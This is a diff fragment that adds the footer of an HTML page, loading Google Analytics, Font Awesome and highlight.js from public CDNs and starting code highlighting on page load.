+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
